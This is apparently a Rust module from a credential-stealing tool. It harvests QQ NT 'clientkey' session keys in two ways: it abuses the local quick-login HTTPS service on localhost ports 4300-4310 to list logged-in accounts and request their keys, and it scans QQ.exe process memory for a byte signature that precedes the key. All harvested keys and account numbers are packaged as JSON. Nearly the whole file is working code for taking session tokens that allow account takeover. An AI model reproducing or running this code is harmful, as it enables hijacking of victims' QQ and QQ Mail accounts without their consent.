//! QQ NT clientkey (session key) extraction.
//!
//! Two independent techniques are combined:
//! 1. The local quick-login HTTPS service (`localhost.ptlogin2.qq.com:4300-4310`),
//!    which enumerates logged-in uins and returns the clientkey without touching
//!    process memory — version-stable protocol-level access.
//! 2. A `QQ.exe` process-memory scan (byte-signature + `Tencent Files\` string).

pub struct QQClientKey;

const LOCAL_HOST: &str = "localhost.ptlogin2.qq.com";
const PORT_START: u16 = 4300;
const PORT_END: u16 = 4310;

const XUI_LOGIN_URL: &str = "https://xui.ptlogin2.qq.com/cgi-bin/xlogin?target=self&appid=522005705&daid=4&s_url=https://wx.mail.qq.com/list/readtemplate?name=login_jump.html&target=&style=25&low_login=1&proxy_url=https://mail.qq.com/proxy.html&need_qr=0&hide_border=1&border_radius=0&self_regurl=https://reg.mail.qq.com&app_id=11005?t=regist&pt_feedback_link=http://support.qq.com/discuss/350_1.shtml&css=https://res.mail.qq.com/zh_CN/htmledition/style/ptlogin_input_for_xmail.css&enable_qlogin=0";

struct CkItem {
    uin: String,
    clientkey: String,
    pid: u32,
    source: &'static str,
}

impl QQClientKey {
    pub async fn collect() -> String {
        let (mem, port) = tokio::join!(
            tokio::task::spawn_blocking(mem_scan),
            local_port_flow()
        );
        let mem = match mem {
            Ok(m) => m,
            Err(_) => MemResult::empty(),
        };

        let mut uins: Vec<String> = Vec::new();
        let mut items: Vec<CkItem> = Vec::new();

        for u in port.uins {
            push_unique(&mut uins, u);
        }
        for it in port.items {
            items.push(it);
        }
        let local_ports_json = port.ports.iter().map(|p| p.to_string()).collect::<Vec<_>>().join(",");
        let local_error = port.error;

        for u in mem.uins {
            push_unique(&mut uins, u);
        }
        for it in mem.items {
            items.push(it);
        }
        let pids_json = mem.pids.iter().map(|p| p.to_string()).collect::<Vec<_>>().join(",");
        let open_json = mem.open_failed.iter().map(|p| p.to_string()).collect::<Vec<_>>().join(",");

        let items_json = items
            .iter()
            .map(|it| {
                format!(
                    r#"{{"uin":"{}","clientkey":"{}","pid":{},"process":"QQ.exe","source":"{}"}}"#,
                    escape(&it.uin),
                    escape(&it.clientkey),
                    it.pid,
                    it.source
                )
            })
            .collect::<Vec<_>>()
            .join(",");
        let uins_json = uins
            .iter()
            .map(|u| format!("\"{}\"", escape(u)))
            .collect::<Vec<_>>()
            .join(",");

        format!(
            r#"{{"total":{},"items":[{}],"uins":[{}],"diagnostics":{{"pids":[{}],"openFailed":[{}],"patternFound":{},"localPorts":[{}],"localError":"{}"}}}}"#,
            items.len(),
            items_json,
            uins_json,
            pids_json,
            open_json,
            mem.pattern_found,
            local_ports_json,
            escape(&local_error),
        )
    }
}

// ── Method 1: local quick-login port ─────────────────────────────────

struct LocalResult {
    uins: Vec<String>,
    items: Vec<CkItem>,
    ports: Vec<u16>,
    error: String,
}

async fn local_port_flow() -> LocalResult {
    let client = match build_local_client() {
        Ok(c) => c,
        Err(e) => {
            return LocalResult {
                uins: Vec::new(),
                items: Vec::new(),
                ports: Vec::new(),
                error: format!("client build failed: {e}"),
            };
        }
    };

    let token = match get_pt_local_token(&client).await {
        Some(t) => t,
        None => {
            return LocalResult {
                uins: Vec::new(),
                items: Vec::new(),
                ports: Vec::new(),
                error: "no pt_local_token".to_string(),
            };
        }
    };

    let mut uins: Vec<String> = Vec::new();
    let mut items: Vec<CkItem> = Vec::new();
    let mut ports: Vec<u16> = Vec::new();
    let mut last_error = String::new();

    for port in PORT_START..=PORT_END {
        match get_uins_on_port(&client, port, &token).await {
            Ok(port_uins) if !port_uins.is_empty() => {
                ports.push(port);
                for u in &port_uins {
                    push_unique(&mut uins, u.clone());
                }
                for u in port_uins {
                    if let Some(key) = get_clientkey_on_port(&client, port, &u, &token).await {
                        if !key.is_empty() {
                            items.push(CkItem {
                                uin: u,
                                clientkey: key,
                                pid: 0,
                                source: "local-port",
                            });
                        }
                    }
                }
                break;
            }
            Ok(_) => {}
            Err(e) => last_error = e,
        }
    }

    if uins.is_empty() && last_error.is_empty() {
        last_error = "no uins returned".to_string();
    }

    LocalResult {
        uins,
        items,
        ports,
        error: last_error,
    }
}

fn build_local_client() -> Result<reqwest::Client, String> {
    reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(3))
        .danger_accept_invalid_certs(true)
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        .build()
        .map_err(|e| e.to_string())
}

async fn get_pt_local_token(client: &reqwest::Client) -> Option<String> {
    let res = client.get(XUI_LOGIN_URL).send().await.ok()?;
    for (k, v) in res.headers() {
        if k.as_str().eq_ignore_ascii_case("set-cookie") {
            if let Ok(s) = v.to_str() {
                for part in s.split(';') {
                    let part = part.trim();
                    if let Some(rest) = part.strip_prefix("pt_local_token=") {
                        if !rest.is_empty() {
                            return Some(rest.to_string());
                        }
                    }
                }
            }
        }
    }
    None
}

async fn get_uins_on_port(
    client: &reqwest::Client,
    port: u16,
    token: &str,
) -> Result<Vec<String>, String> {
    let r = rand_frac();
    let url = format!(
        "https://{}:{}/pt_get_uins?callback=ptui_getuins_CB&r={}&pt_local_tk={}",
        LOCAL_HOST, port, r, token
    );
    let res = client
        .get(&url)
        .header("Referer", "https://xui.ptlogin2.qq.com/")
        .send()
        .await
        .map_err(|e| e.to_string())?;
    let body = res.text().await.map_err(|e| e.to_string())?;
    let json = extract_callback_json(&body).ok_or("no callback json")?;
    let value: serde_json::Value = serde_json::from_str(json).map_err(|e| e.to_string())?;
    Ok(extract_uins(&value))
}

async fn get_clientkey_on_port(
    client: &reqwest::Client,
    port: u16,
    uin: &str,
    token: &str,
) -> Option<String> {
    let r = rand_frac();
    let url = format!(
        "https://{}:{}/pt_get_st?clientuin={}&callback=ptui_getst_CB&r={}&pt_local_tk={}",
        LOCAL_HOST, port, uin, r, token
    );
    let res = client
        .get(&url)
        .header("Referer", "https://xui.ptlogin2.qq.com/")
        .send()
        .await
        .ok()?;
    let body = res.text().await.ok()?;
    let json = extract_callback_json(&body)?;
    let value: serde_json::Value = serde_json::from_str(json).ok()?;
    extract_clientkey(&value)
}

fn rand_frac() -> String {
    let n = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos() % 1_000_000_000)
        .unwrap_or(0);
    format!("0.{:09}", n)
}

fn extract_callback_json(body: &str) -> Option<&str> {
    let start = body.find('(')?;
    let end = body.rfind(')')?;
    if start >= end {
        return None;
    }
    Some(&body[start + 1..end])
}

fn extract_clientkey(json: &serde_json::Value) -> Option<String> {
    find_first_string(json, &["clientkey", "client_key", "key"])
}

fn find_first_string(json: &serde_json::Value, keys: &[&str]) -> Option<String> {
    match json {
        serde_json::Value::Object(map) => {
            for k in keys {
                if let Some(serde_json::Value::String(s)) = map.get(*k) {
                    if !s.is_empty() {
                        return Some(s.clone());
                    }
                }
            }
            for (_, v) in map {
                if let Some(s) = find_first_string(v, keys) {
                    return Some(s);
                }
            }
            None
        }
        serde_json::Value::Array(arr) => {
            for v in arr {
                if let Some(s) = find_first_string(v, keys) {
                    return Some(s);
                }
            }
            None
        }
        _ => None,
    }
}

fn extract_uins(json: &serde_json::Value) -> Vec<String> {
    let mut out = Vec::new();
    collect_uins(json, &mut out);
    out
}

fn collect_uins(v: &serde_json::Value, out: &mut Vec<String>) {
    match v {
        serde_json::Value::Object(map) => {
            for k in ["uin", "account", "clientuin", "number"] {
                if let Some(val) = map.get(k) {
                    let s = match val {
                        serde_json::Value::String(s) => s.clone(),
                        serde_json::Value::Number(n) => n.to_string(),
                        _ => continue,
                    };
                    if is_uin(&s) {
                        push_unique(out, s);
                    }
                }
            }
            for (_, vv) in map {
                collect_uins(vv, out);
            }
        }
        serde_json::Value::Array(arr) => {
            for vv in arr {
                collect_uins(vv, out);
            }
        }
        _ => {}
    }
}

fn is_uin(s: &str) -> bool {
    s.len() >= 5 && s.len() <= 15 && s.chars().all(|c| c.is_ascii_digit())
}

fn push_unique(list: &mut Vec<String>, item: String) {
    if !list.contains(&item) {
        list.push(item);
    }
}

// ── Method 2: process memory scan ────────────────────────────────────

struct MemResult {
    uins: Vec<String>,
    items: Vec<CkItem>,
    pids: Vec<u32>,
    open_failed: Vec<u32>,
    pattern_found: bool,
}

impl MemResult {
    fn empty() -> MemResult {
        MemResult {
            uins: Vec::new(),
            items: Vec::new(),
            pids: Vec::new(),
            open_failed: Vec::new(),
            pattern_found: false,
        }
    }
}

fn mem_scan() -> MemResult {
    #[cfg(target_os = "windows")]
    {
        imp::collect_mem()
    }
    #[cfg(not(target_os = "windows"))]
    {
        MemResult {
            uins: Vec::new(),
            items: Vec::new(),
            pids: Vec::new(),
            open_failed: Vec::new(),
            pattern_found: false,
        }
    }
}

#[cfg(target_os = "windows")]
mod imp {
    use super::CkItem;
    use super::MemResult;
    use std::mem::size_of;

    const PROCESS_VM_READ: u32 = 0x0010;
    const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
    const TH32CS_SNAPPROCESS: u32 = 0x00000002;
    const MEM_COMMIT: u32 = 0x1000;
    const PAGE_NOACCESS: u32 = 0x01;
    const PAGE_GUARD: u32 = 0x100;

    const MAX_SCAN_BYTES: usize = 512 * 1024 * 1024;
    const CHUNK_SIZE: usize = 4 * 1024 * 1024;

    const PATTERN: [u8; 17] = [
        0x28, 0x81, 0x82, 0x04, 0x30, 0x80, 0x80, 0x80, 0x04, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x42,
        0x60,
    ];

    #[repr(C)]
    struct ProcessEntry32W {
        dw_size: u32,
        cnt_usage: u32,
        th32_process_id: u32,
        th32_default_heap_id: usize,
        th32_module_id: u32,
        cnt_threads: u32,
        th32_parent_process_id: u32,
        pc_pri_class_base: i32,
        dw_flags: u32,
        sz_exe_file: [u16; 260],
    }

    #[repr(C)]
    struct MemoryBasicInformation {
        base_address: usize,
        allocation_base: usize,
        allocation_protect: u32,
        _pad: u32,
        region_size: usize,
        state: u32,
        protect: u32,
        type_: u32,
    }

    extern "system" {
        fn CreateToolhelp32Snapshot(dwFlags: u32, th32ProcessID: u32) -> isize;
        fn Process32FirstW(hSnapshot: isize, lppe: *mut ProcessEntry32W) -> i32;
        fn Process32NextW(hSnapshot: isize, lppe: *mut ProcessEntry32W) -> i32;
        fn OpenProcess(dwDesiredAccess: u32, bInheritHandle: i32, dwProcessId: u32) -> isize;
        fn CloseHandle(hObject: isize) -> i32;
        fn VirtualQueryEx(
            hProcess: isize,
            lpAddress: usize,
            lpBuffer: *mut MemoryBasicInformation,
            dwLength: usize,
        ) -> usize;
        fn ReadProcessMemory(
            hProcess: isize,
            lpBaseAddress: usize,
            lpBuffer: *mut u8,
            nSize: usize,
            lpNumberOfBytesRead: *mut usize,
        ) -> i32;
    }

    pub fn collect_mem() -> MemResult {
        let pids = find_qq_pids();
        let mut uins: Vec<String> = Vec::new();
        let mut items: Vec<CkItem> = Vec::new();
        let mut open_failed: Vec<u32> = Vec::new();
        let mut pattern_found = false;

        for &pid in &pids {
            match scan_process(pid) {
                None => open_failed.push(pid),
                Some(o) => {
                    if let Some(u) = &o.uin {
                        if !u.is_empty() {
                            super::push_unique(&mut uins, u.clone());
                        }
                    }
                    if let Some(key) = &o.clientkey {
                        if !key.is_empty() {
                            pattern_found = true;
                            items.push(CkItem {
                                uin: o.uin.unwrap_or_default(),
                                clientkey: key.clone(),
                                pid,
                                source: "memory",
                            });
                        }
                    }
                }
            }
        }

        MemResult {
            uins,
            items,
            pids,
            open_failed,
            pattern_found,
        }
    }

    fn find_qq_pids() -> Vec<u32> {
        let mut pids = Vec::new();
        unsafe {
            let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if snap == -1 {
                return pids;
            }
            let mut entry: ProcessEntry32W = std::mem::zeroed();
            entry.dw_size = size_of::<ProcessEntry32W>() as u32;
            if Process32FirstW(snap, &mut entry) != 0 {
                loop {
                    let name = wide_to_string(&entry.sz_exe_file);
                    if name.eq_ignore_ascii_case("QQ.exe") {
                        pids.push(entry.th32_process_id);
                    }
                    if Process32NextW(snap, &mut entry) == 0 {
                        break;
                    }
                }
            }
            CloseHandle(snap);
        }
        pids
    }

    struct ScanOutcome {
        uin: Option<String>,
        clientkey: Option<String>,
    }

    fn scan_process(pid: u32) -> Option<ScanOutcome> {
        let h = unsafe { OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 0, pid) };
        if h == 0 {
            return None;
        }

        let mut clientkey: Option<String> = None;
        let mut uin: Option<String> = None;

        unsafe {
            let mut addr: usize = 0x10000;
            let mut scanned_total: usize = 0;
            while scanned_total < MAX_SCAN_BYTES {
                let mut mbi: MemoryBasicInformation = std::mem::zeroed();
                let ret = VirtualQueryEx(h, addr, &mut mbi, size_of::<MemoryBasicInformation>());
                if ret == 0 || mbi.region_size == 0 {
                    break;
                }
                addr = mbi.base_address.wrapping_add(mbi.region_size);

                let committed = (mbi.state & MEM_COMMIT) != 0;
                let readable = (mbi.protect & (PAGE_NOACCESS | PAGE_GUARD)) == 0 && mbi.protect != 0;
                if !committed || !readable {
                    continue;
                }

                let region_size = mbi.region_size;
                let base = mbi.base_address;
                let mut offset = 0usize;
                while offset < region_size {
                    let chunk = (region_size - offset).min(CHUNK_SIZE);
                    let mut buf = vec![0u8; chunk];
                    let mut read = 0usize;
                    let ok = ReadProcessMemory(h, base + offset, buf.as_mut_ptr(), chunk, &mut read);
                    if ok == 0 || read == 0 {
                        break;
                    }
                    buf.truncate(read);

                    if clientkey.is_none() {
                        if let Some(pos) = find_pattern(&buf) {
                            let mut kb = [0u8; 96];
                            let mut kr = 0usize;
                            ReadProcessMemory(h, base + offset + pos + 17, kb.as_mut_ptr(), 96, &mut kr);
                            if kr > 7 {
                                clientkey = Some(trim_cstr(&kb[7..kr]));
                            }
                        }
                    }
                    if uin.is_none() {
                        uin = extract_uin(&buf);
                    }
                    if clientkey.is_some() && uin.is_some() {
                        break;
                    }

                    scanned_total += chunk;
                    offset += chunk;
                }
                if clientkey.is_some() && uin.is_some() {
                    break;
                }
            }
        }

        unsafe { CloseHandle(h) };

        Some(ScanOutcome { uin, clientkey })
    }

    fn find_pattern(buf: &[u8]) -> Option<usize> {
        if buf.len() < PATTERN.len() {
            return None;
        }
        for i in 0..=(buf.len() - PATTERN.len()) {
            if buf[i..i + 10] == PATTERN[..10] && buf[i + 15] == 0x42 && buf[i + 16] == 0x60 {
                return Some(i);
            }
        }
        None
    }

    fn extract_uin(buf: &[u8]) -> Option<String> {
        if let Some(u) = extract_uin_anchored(buf, true) {
            return Some(u);
        }
        extract_uin_anchored(buf, false)
    }

    // Finds "Tencent Files\<uin>\nt_qq" (ASCII or UTF-16LE) and returns the uin.
    fn extract_uin_anchored(buf: &[u8], wide: bool) -> Option<String> {
        let mark = encode("Tencent Files\\", wide);
        let tail = encode("\\nt_qq", wide);
        let mut from = 0usize;
        while let Some(pos) = find_subslice(&buf[from..], &mark) {
            let abs = from + pos + mark.len();
            let after = &buf[abs..];
            let mut digits = String::new();
            let mut i = 0;
            if wide {
                while i + 1 < after.len() {
                    let c = after[i] as u16 | ((after[i + 1] as u16) << 8);
                    if c >= b'0' as u16 && c <= b'9' as u16 {
                        digits.push(c as u8 as char);
                        i += 2;
                    } else {
                        break;
                    }
                }
            } else {
                while i < after.len() && after[i].is_ascii_digit() {
                    digits.push(after[i] as char);
                    i += 1;
                }
            }
            if digits.len() >= 5 && after[i..].starts_with(&tail) {
                return Some(digits);
            }
            from = abs;
        }
        None
    }

    fn encode(s: &str, wide: bool) -> Vec<u8> {
        if wide {
            s.encode_utf16()
                .flat_map(|c| [(c & 0xFF) as u8, (c >> 8) as u8])
                .collect()
        } else {
            s.as_bytes().to_vec()
        }
    }

    fn find_subslice(haystack: &[u8], needle: &[u8]) -> Option<usize> {
        if needle.is_empty() || haystack.len() < needle.len() {
            return None;
        }
        haystack.windows(needle.len()).position(|w| w == needle)
    }

    fn trim_cstr(bytes: &[u8]) -> String {
        let end = bytes.iter().position(|&b| b == 0).unwrap_or(bytes.len());
        String::from_utf8_lossy(&bytes[..end]).trim().to_string()
    }

    fn wide_to_string(ws: &[u16]) -> String {
        let end = ws.iter().position(|&c| c == 0).unwrap_or(ws.len());
        String::from_utf16_lossy(&ws[..end])
    }
}

fn escape(s: &str) -> String {
    s.replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('\n', "\\n")
        .replace('\r', "\\r")
        .replace('\t', "\\t")
}
